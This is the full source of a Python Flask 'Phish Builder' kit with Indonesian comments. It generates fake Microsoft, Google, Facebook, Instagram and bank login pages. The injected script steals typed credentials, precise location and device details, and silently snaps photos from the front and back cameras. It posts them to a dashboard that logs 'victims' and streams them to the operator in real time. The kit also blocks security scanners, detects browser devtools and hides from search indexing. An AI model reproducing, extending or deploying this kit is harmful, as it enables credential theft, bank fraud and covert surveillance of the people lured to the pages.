from flask import Flask, request, render_template, jsonify, send_from_directory, Response, redirect, session
from flask_cors import CORS
from datetime import datetime
from functools import wraps
import os, json, uuid, time, threading, queue, secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)          # ganti kalau mau fixed
CORS(app)

# ========== ADMIN PASSWORD ==========
ADMIN_PASSWORD = "danxxxxxxxxxx"     # <--- GANTI INI KALAU MAU
# ===================================

BASE = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE, "data")
GEN_DIR = os.path.join(BASE, "generated")
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(GEN_DIR, exist_ok=True)

# In-memory live feed + persistence
pages = {}          # page_id -> meta
victims = {}        # page_id -> list of victim dicts
subscribers = {}    # page_id -> list of Queue

def load_state():
    global pages, victims
    pfile = os.path.join(DATA_DIR, "pages.json")
    vfile = os.path.join(DATA_DIR, "victims.json")
    if os.path.exists(pfile):
        with open(pfile) as f:
            pages = json.load(f)
    if os.path.exists(vfile):
        with open(vfile) as f:
            victims = json.load(f)

def save_state():
    with open(os.path.join(DATA_DIR, "pages.json"), "w") as f:
        json.dump(pages, f, indent=2)
    with open(os.path.join(DATA_DIR, "victims.json"), "w") as f:
        json.dump(victims, f, indent=2)

load_state()

# ---------- TEMPLATES AVAILABLE ----------
TEMPLATES = {
    "microsoft": {
        "name": "Microsoft Login",
        "desc": "Halaman login Microsoft resmi",
        "preview": "/static/preview_ms.png"
    },
    "google": {
        "name": "Google Login",
        "desc": "Halaman login Google",
        "preview": "/static/preview_google.png"
    },
    "facebook": {
        "name": "Facebook Login",
        "desc": "Halaman login Facebook",
        "preview": "/static/preview_fb.png"
    },
    "instagram": {
        "name": "Instagram Login",
        "desc": "Halaman login Instagram",
        "preview": "/static/preview_ig.png"
    },
    "bank": {
        "name": "Bank Login (Generic)",
        "desc": "Login mobile banking generik",
        "preview": "/static/preview_bank.png"
    }
}

# ---------- AUTH ----------
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("admin"):
            return redirect("/login")
        return f(*args, **kwargs)
    return decorated

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASSWORD:
            session["admin"] = True
            return redirect("/")
        error = "Password salah"
    return render_template("login.html", error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

# ---------- ROUTES (ADMIN PROTECTED) ----------

@app.route("/")
@login_required
def home():
    return render_template("home.html", pages=pages, templates=TEMPLATES)

@app.route("/create", methods=["GET", "POST"])
@login_required
def create():
    if request.method == "GET":
        return render_template("create.html", templates=TEMPLATES)

    data = request.get_json() or request.form
    title = data.get("title", "Login").strip()
    template = data.get("template", "microsoft")
    redirect_url = data.get("redirect", "https://www.microsoft.com").strip()
    custom_domain = data.get("custom_domain", "").strip()

    page_id = str(uuid.uuid4())[:8]
    pages[page_id] = {
        "id": page_id,
        "title": title,
        "template": template,
        "redirect": redirect_url,
        "custom_domain": custom_domain,
        "created": datetime.utcnow().isoformat() + "Z",
        "victims": 0
    }
    victims[page_id] = []
    save_state()

    # Generate the phishing HTML
    html = generate_phish_page(page_id, template, title, redirect_url)
    with open(os.path.join(GEN_DIR, f"{page_id}.html"), "w", encoding="utf-8") as f:
        f.write(html)

    return jsonify({"ok": True, "page_id": page_id, "url": f"/p/{page_id}"})

@app.route("/dashboard/<page_id>")
@login_required
def dashboard(page_id):
    if page_id not in pages:
        return "Page not found", 404
    return render_template("dashboard.html", page=pages[page_id], page_id=page_id)

@app.route("/api/victims/<page_id>")
@login_required
def api_victims(page_id):
    return jsonify(victims.get(page_id, []))

@app.route("/api/stream/<page_id>")
@login_required
def stream(page_id):
    def event_stream():
        q = queue.Queue()
        if page_id not in subscribers:
            subscribers[page_id] = []
        subscribers[page_id].append(q)
        try:
            # send current state first
            yield f"data: {json.dumps(victims.get(page_id, []))}\n\n"
            while True:
                try:
                    data = q.get(timeout=25)
                    yield f"data: {json.dumps(data)}\n\n"
                except queue.Empty:
                    yield ": keepalive\n\n"
        finally:
            if page_id in subscribers and q in subscribers[page_id]:
                subscribers[page_id].remove(q)

    return Response(event_stream(), mimetype="text/event-stream")

@app.route("/p/<page_id>")
def phish_page(page_id):
    path = os.path.join(GEN_DIR, f"{page_id}.html")
    if not os.path.exists(path):
        return "Not found", 404

    # basic bot / scraper filter
    ua = (request.headers.get("User-Agent") or "").lower()
    bad = ["wget", "curl", "scrapy", "python-requests", "httpclient", "libwww", "httrack", "nmap", "sqlmap"]
    if any(b in ua for b in bad):
        return "<html><body style='background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;font-size:28px'>NGAPAIN KOCAK😹</body></html>", 200

    resp = send_from_directory(GEN_DIR, f"{page_id}.html")
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    resp.headers["Pragma"] = "no-cache"
    resp.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"
    return resp

@app.route("/capture/<page_id>", methods=["POST"])
def capture(page_id):
    if page_id not in pages:
        return jsonify({"ok": False}), 404

    payload = request.get_json(force=True, silent=True) or {}
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")

    victim = {
        "id": str(uuid.uuid4())[:8],
        "time": datetime.utcnow().isoformat() + "Z",
        "ip": ip,
        "user_agent": ua,
        "email": payload.get("email") or payload.get("username") or "",
        "password": payload.get("password") or "",
        "phone": payload.get("phone") or "",
        "location": payload.get("location") or {},
        "address": payload.get("address") or {},
        "device": payload.get("device") or {},
        "camera_front": payload.get("camera_front") or None,   # base64
        "camera_back": payload.get("camera_back") or None,
        "battery": payload.get("battery") or {},
        "network": payload.get("network") or {},
        "screen": payload.get("screen") or {},
        "raw": payload
    }

    if page_id not in victims:
        victims[page_id] = []
    victims[page_id].insert(0, victim)
    pages[page_id]["victims"] = len(victims[page_id])
    save_state()

    # push to live subscribers
    if page_id in subscribers:
        for q in subscribers[page_id]:
            try:
                q.put(victims[page_id])
            except:
                pass

    return jsonify({"ok": True})

@app.route("/static/<path:filename>")
def static_files(filename):
    return send_from_directory(os.path.join(BASE, "static"), filename)

# ---------- PHISH PAGE GENERATOR ----------

def generate_phish_page(page_id, template, title, redirect_url):
    # Common capture JS injected into every template + anti-scrape
    capture_js = f"""
<script>
const PAGE_ID = "{page_id}";
const REDIRECT = "{redirect_url}";
let captured = {{}};

/* ===== ANTI-SCRAPE / ANTI-DEVTOOLS ===== */
(function() {{
  // disable right click
  document.addEventListener('contextmenu', e => e.preventDefault());
  // disable common shortcuts
  document.addEventListener('keydown', e => {{
    if (e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && ['I','J','C','U'].includes(e.key.toUpperCase())) ||
        (e.ctrlKey && e.key.toUpperCase() === 'U')) {{
      e.preventDefault();
      showTroll();
    }}
  }});

  function showTroll() {{
    document.documentElement.innerHTML = `<body style="margin:0;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh;font-size:28px;text-align:center">
NGAPAIN KOCAK😹<br><br><span style="font-size:16px;color:#0a0">kode ga ada di sini</span></body>`;
  }}

  // detect devtools by size trick
  let devtools = false;
  const threshold = 160;
  setInterval(() => {{
    const widthDiff = window.outerWidth - window.innerWidth > threshold;
    const heightDiff = window.outerHeight - window.innerHeight > threshold;
    if (widthDiff || heightDiff) {{
      if (!devtools) {{
        devtools = true;
        showTroll();
      }}
    }}
  }}, 500);

  // detect view-source / scraper user-agents (basic)
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes('wget') || ua.includes('curl') || ua.includes('scrapy') || ua.includes('python-requests') || ua.includes('httpclient')) {{
    showTroll();
  }}
}})();
/* ====================================== */

async function getLocation() {{
  return new Promise((resolve) => {{
    if (!navigator.geolocation) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      async (pos) => {{
        const loc = {{
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          altitude: pos.coords.altitude,
          speed: pos.coords.speed
        }};
        try {{
          const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${{loc.lat}}&lon=${{loc.lon}}&zoom=18&addressdetails=1`, {{
            headers: {{ "Accept-Language": "id" }}
          }});
          const data = await r.json();
          loc.address = data.address || {{}};
          loc.display = data.display_name || "";
        }} catch(e) {{}}
        resolve(loc);
      }},
      () => resolve(null),
      {{ enableHighAccuracy: true, timeout: 10000 }}
    );
  }});
}}

async function getCamera(facing) {{
  try {{
    const stream = await navigator.mediaDevices.getUserMedia({{
      video: {{ facingMode: facing }},
      audio: false
    }});
    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();
    await new Promise(r => setTimeout(r, 800));
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext("2d").drawImage(video, 0, 0);
    stream.getTracks().forEach(t => t.stop());
    return canvas.toDataURL("image/jpeg", 0.7);
  }} catch(e) {{
    return null;
  }}
}}

async function collectDevice() {{
  const d = {{
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    vendor: navigator.vendor,
    webdriver: navigator.webdriver
  }};
  if (navigator.getBattery) {{
    try {{
      const b = await navigator.getBattery();
      d.battery = {{ level: b.level, charging: b.charging }};
    }} catch(e) {{}}
  }}
  if (navigator.connection) {{
    d.network = {{
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    }};
  }}
  d.screen = {{
    width: screen.width,
    height: screen.height,
    availWidth: screen.availWidth,
    availHeight: screen.availHeight,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio
  }};
  d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  return d;
}}

async function fullCapture(formData) {{
  const device = await collectDevice();
  const location = await getLocation();
  // Try both cameras (order: user first then environment)
  const camFront = await getCamera("user");
  const camBack  = await getCamera("environment");

  const payload = {{
    ...formData,
    device: device,
    location: location,
    address: location ? location.address : {{}},
    camera_front: camFront,
    camera_back: camBack,
    battery: device.battery || {{}},
    network: device.network || {{}},
    screen: device.screen || {{}}
  }};

  try {{
    await fetch("/capture/" + PAGE_ID, {{
      method: "POST",
      headers: {{ "Content-Type": "application/json" }},
      body: JSON.stringify(payload)
    }});
  }} catch(e) {{}}
  window.location.href = REDIRECT;
}}

// Auto-trigger location + cameras on page load (silent permission request)
window.addEventListener("load", () => {{
  // Warm up permissions
  getLocation();
  // Pre-request camera so later capture is faster
  navigator.mediaDevices.getUserMedia({{ video: true }}).then(s => s.getTracks().forEach(t => t.stop())).catch(()=>{{}});
}});
</script>
"""

    if template == "microsoft":
        return f"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your Microsoft account</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,sans-serif}}
body{{background:#f2f2f2;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}}
.card{{background:#fff;width:100%;max-width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2);border-radius:0}}
.logo{{margin-bottom:16px}}
.logo svg{{width:108px}}
h1{{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}}
.sub{{font-size:15px;color:#1b1b1b;margin-bottom:24px}}
input{{width:100%;padding:10px 12px;border:1px solid #605e5c;border-radius:0;font-size:15px;margin-bottom:16px;outline:none}}
input:focus{{border-color:#0067b8;border-width:2px;padding:9px 11px}}
button{{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px;font-weight:600;cursor:pointer;border-radius:0}}
button:hover{{background:#005a9e}}
.links{{margin-top:20px;font-size:13px}}
.links a{{color:#0067b8;text-decoration:none}}
.footer{{margin-top:40px;font-size:12px;color:#616161;text-align:center}}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 23 23"><path fill="#f25022" d="M1 1h10v10H1z"/><path fill="#00a4ef" d="M12 1h10v10H12z"/><path fill="#7fba00" d="M1 12h10v10H1z"/><path fill="#ffb900" d="M12 12h10v10H12z"/></svg>
  </div>
  <h1>Sign in</h1>
  <p class="sub">to continue to Microsoft</p>
  <form id="f" onsubmit="return false">
    <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required autocomplete="username">
    <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
    <button type="submit" id="btn">Sign in</button>
  </form>
  <div class="links">
    <a href="#">Forgot password?</a><br><br>
    <a href="#">No account? Create one!</a>
  </div>
</div>
<div class="footer">© Microsoft {datetime.now().year}</div>
{capture_js}
<script>
document.getElementById("f").addEventListener("submit", async (e) => {{
  e.preventDefault();
  document.getElementById("btn").disabled = true;
  document.getElementById("btn").textContent = "Signing in...";
  await fullCapture({{
    email: document.getElementById("email").value,
    password: document.getElementById("password").value
  }});
}});
</script>
</body>
</html>"""

    elif template == "google":
        return f"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0;font-family:'Google Sans',Roboto,Arial,sans-serif}}
body{{background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}}
.card{{width:100%;max-width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}}
.logo{{text-align:center;margin-bottom:16px}}
h1{{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px;color:#202124}}
.sub{{text-align:center;font-size:16px;color:#202124;margin-bottom:32px}}
label{{font-size:14px;color:#5f6368;display:block;margin-bottom:6px}}
input{{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:20px;outline:none}}
input:focus{{border-color:#1a73e8;border-width:2px;padding:12px 14px}}
.btn-row{{display:flex;justify-content:space-between;align-items:center;margin-top:24px}}
.btn-row a{{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}}
button{{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}}
button:hover{{background:#1765cc;box-shadow:0 1px 2px rgba(0,0,0,.3)}}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg width="48" height="48" viewBox="0 0 48 48"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/><path fill="#FBBC05" d="M11.69 28.18c-.44-1.32-.69-2.73-.69-4.18s.25-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24s.85 6.91 2.34 9.88l7.35-5.7z"/><path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 12.31-9.07z"/></svg>
  </div>
  <h1>Sign in</h1>
  <p class="sub">Use your Google Account</p>
  <form id="f" onsubmit="return false">
    <label>Email or phone</label>
    <input type="email" id="email" required autocomplete="username">
    <label>Password</label>
    <input type="password" id="password" required autocomplete="current-password">
    <div class="btn-row">
      <a href="#">Forgot password?</a>
      <button type="submit" id="btn">Next</button>
    </div>
  </form>
</div>
{capture_js}
<script>
document.getElementById("f").addEventListener("submit", async (e) => {{
  e.preventDefault();
  document.getElementById("btn").disabled = true;
  document.getElementById("btn").textContent = "Loading...";
  await fullCapture({{
    email: document.getElementById("email").value,
    password: document.getElementById("password").value
  }});
}});
</script>
</body>
</html>"""

    elif template == "facebook":
        return f"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook – log in or sign up</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0;font-family:Helvetica,Arial,sans-serif}}
body{{background:#f0f2f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}}
.logo{{color:#0866ff;font-size:56px;font-weight:700;margin-bottom:20px;letter-spacing:-1px}}
.card{{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);width:100%;max-width:396px}}
input{{width:100%;padding:14px 16px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;margin-bottom:12px}}
input:focus{{outline:none;border-color:#0866ff}}
button{{width:100%;padding:12px;background:#0866ff;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}}
button:hover{{background:#0759d9}}
.forgot{{text-align:center;margin:16px 0;font-size:14px}}
.forgot a{{color:#0866ff;text-decoration:none}}
.divider{{border-bottom:1px solid #dadde1;margin:20px 0}}
.create{{display:block;width:fit-content;margin:0 auto;padding:12px 16px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;text-decoration:none}}
</style>
</head>
<body>
<div class="logo">facebook</div>
<div class="card">
  <form id="f" onsubmit="return false">
    <input type="text" id="email" placeholder="Email address or phone number" required>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit" id="btn">Log in</button>
  </form>
  <div class="forgot"><a href="#">Forgotten password?</a></div>
  <div class="divider"></div>
  <a href="#" class="create">Create new account</a>
</div>
{capture_js}
<script>
document.getElementById("f").addEventListener("submit", async (e) => {{
  e.preventDefault();
  document.getElementById("btn").disabled = true;
  document.getElementById("btn").textContent = "Logging in...";
  await fullCapture({{
    email: document.getElementById("email").value,
    password: document.getElementById("password").value
  }});
}});
</script>
</body>
</html>"""

    elif template == "instagram":
        return f"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}}
body{{background:#fafafa;min-height:100vh;display:flex;align-items:center;justify-content:center}}
.card{{background:#fff;border:1px solid #dbdbdb;width:100%;max-width:350px;padding:40px 40px 20px;text-align:center}}
.logo{{font-family:"Grand Hotel",cursive;font-size:48px;margin-bottom:24px;font-weight:400}}
input{{width:100%;padding:10px 12px;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;margin-bottom:8px;background:#fafafa}}
button{{width:100%;padding:8px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;margin-top:8px;cursor:pointer}}
button:disabled{{opacity:.7}}
.or{{display:flex;align-items:center;margin:18px 0;color:#8e8e8e;font-size:13px;font-weight:600}}
.or::before,.or::after{{content:"";flex:1;height:1px;background:#dbdbdb}}
.or span{{padding:0 18px}}
.fb{{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:block;margin-bottom:20px}}
.forgot{{color:#00376b;font-size:12px;text-decoration:none}}
.signup{{margin-top:12px;border:1px solid #dbdbdb;background:#fff;padding:20px;font-size:14px;width:100%;max-width:350px;text-align:center}}
.signup a{{color:#0095f6;font-weight:600;text-decoration:none}}
</style>
</head>
<body>
<div style="display:flex;flex-direction:column;align-items:center;gap:12px">
  <div class="card">
    <div class="logo">Instagram</div>
    <form id="f" onsubmit="return false">
      <input type="text" id="email" placeholder="Phone number, username, or email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit" id="btn">Log in</button>
    </form>
    <div class="or"><span>OR</span></div>
    <a href="#" class="fb">Log in with Facebook</a>
    <a href="#" class="forgot">Forgot password?</a>
  </div>
  <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
</div>
{capture_js}
<script>
document.getElementById("f").addEventListener("submit", async (e) => {{
  e.preventDefault();
  document.getElementById("btn").disabled = true;
  document.getElementById("btn").textContent = "Logging in...";
  await fullCapture({{
    email: document.getElementById("email").value,
    password: document.getElementById("password").value
  }});
}});
</script>
</body>
</html>"""

    else:  # bank generic
        return f"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Mobile Banking - Login</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0;font-family:system-ui,sans-serif}}
body{{background:linear-gradient(135deg,#0a1628,#1a365d);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}}
.card{{background:rgba(255,255,255,.08);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,.15);border-radius:16px;padding:40px 32px;width:100%;max-width:380px}}
.logo{{text-align:center;font-size:28px;font-weight:700;margin-bottom:8px;letter-spacing:1px}}
.sub{{text-align:center;font-size:13px;opacity:.7;margin-bottom:32px}}
label{{font-size:13px;opacity:.8;display:block;margin-bottom:6px}}
input{{width:100%;padding:14px 16px;border:1px solid rgba(255,255,255,.2);border-radius:8px;font-size:15px;margin-bottom:18px;background:rgba(0,0,0,.2);color:#fff;outline:none}}
input:focus{{border-color:#3b82f6}}
input::placeholder{{color:rgba(255,255,255,.4)}}
button{{width:100%;padding:14px;background:#3b82f6;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}}
button:hover{{background:#2563eb}}
.secure{{text-align:center;margin-top:20px;font-size:12px;opacity:.5}}
</style>
</head>
<body>
<div class="card">
  <div class="logo">SECUREBANK</div>
  <div class="sub">Mobile Banking Login</div>
  <form id="f" onsubmit="return false">
    <label>Nomor Rekening / User ID</label>
    <input type="text" id="email" placeholder="Masukkan User ID" required>
    <label>PIN / Password</label>
    <input type="password" id="password" placeholder="••••••" required>
    <button type="submit" id="btn">Masuk</button>
  </form>
  <div class="secure">🔒 Koneksi aman 256-bit SSL</div>
</div>
{capture_js}
<script>
document.getElementById("f").addEventListener("submit", async (e) => {{
  e.preventDefault();
  document.getElementById("btn").disabled = true;
  document.getElementById("btn").textContent = "Memproses...";
  await fullCapture({{
    email: document.getElementById("email").value,
    password: document.getElementById("password").value
  }});
}});
</script>
</body>
</html>"""

@app.route("/robots.txt")
def robots():
    return "User-agent: *\nDisallow: /\n", 200, {"Content-Type": "text/plain"}

if __name__ == "__main__":
    print("Phish Builder running → http://0.0.0.0:8080")
    app.run(host="0.0.0.0", port=8080, debug=False, threaded=True)
